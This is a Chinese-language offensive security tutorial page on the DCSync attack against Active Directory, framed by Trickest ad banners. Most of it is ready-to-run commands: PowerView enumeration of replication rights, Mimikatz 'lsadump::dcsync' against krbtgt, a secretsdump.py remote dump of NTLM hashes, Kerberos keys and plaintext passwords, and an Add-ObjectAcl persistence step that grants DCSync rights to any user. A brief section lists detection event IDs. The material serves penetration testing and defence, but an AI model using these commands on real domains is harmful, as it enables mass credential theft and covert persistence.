# DCSync

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
使用 [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync) 轻松构建和 **自动化工作流程**，由世界上 **最先进** 的社区工具提供支持。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=dcsync" %}

{{#include ../../banners/hacktricks-training.md}}

## DCSync

**DCSync** 权限意味着对域本身拥有以下权限：**DS-Replication-Get-Changes**、**Replicating Directory Changes All** 和 **Replicating Directory Changes In Filtered Set**。

**关于 DCSync 的重要说明：**

- **DCSync 攻击模拟域控制器的行为，并请求其他域控制器使用目录复制服务远程协议 (MS-DRSR) 复制信息**。由于 MS-DRSR 是 Active Directory 的有效且必要的功能，因此无法关闭或禁用。
- 默认情况下，只有 **域管理员、企业管理员、管理员和域控制器** 组具有所需的权限。
- 如果任何帐户密码以可逆加密存储，Mimikatz 中提供了一个选项可以以明文返回密码。

### Enumeration

使用 `powerview` 检查谁拥有这些权限：
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
### 本地利用
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### 远程利用
```powershell
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-pwd-last-set] #To see when each account's password was last changed
[-history] #To dump password history, may be helpful for offline password cracking
```
`-just-dc` 生成 3 个文件：

- 一个包含 **NTLM 哈希**
- 一个包含 **Kerberos 密钥**
- 一个包含 NTDS 中任何设置了 [**可逆加密**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) 的帐户的明文密码。您可以通过以下命令获取具有可逆加密的用户：

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### 持久性

如果您是域管理员，您可以借助 `powerview` 将此权限授予任何用户：
```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
然后，您可以**检查用户是否正确分配**了这3个权限，通过在输出中查找它们（您应该能够在“ObjectType”字段中看到权限的名称）：
```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### 缓解措施

- 安全事件 ID 4662（对象的审计策略必须启用）– 对一个对象执行了操作
- 安全事件 ID 5136（对象的审计策略必须启用）– 目录服务对象已被修改
- 安全事件 ID 4670（对象的审计策略必须启用）– 对象的权限已更改
- AD ACL 扫描器 - 创建和比较 ACL 的创建报告。 [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## 参考文献

- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [https://yojimbosecurity.ninja/dcsync/](https://yojimbosecurity.ninja/dcsync/)

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
使用 [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=dcsync) 轻松构建和 **自动化工作流程**，由世界上 **最先进** 的社区工具提供支持。\
今天就获取访问权限：

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=dcsync" %}
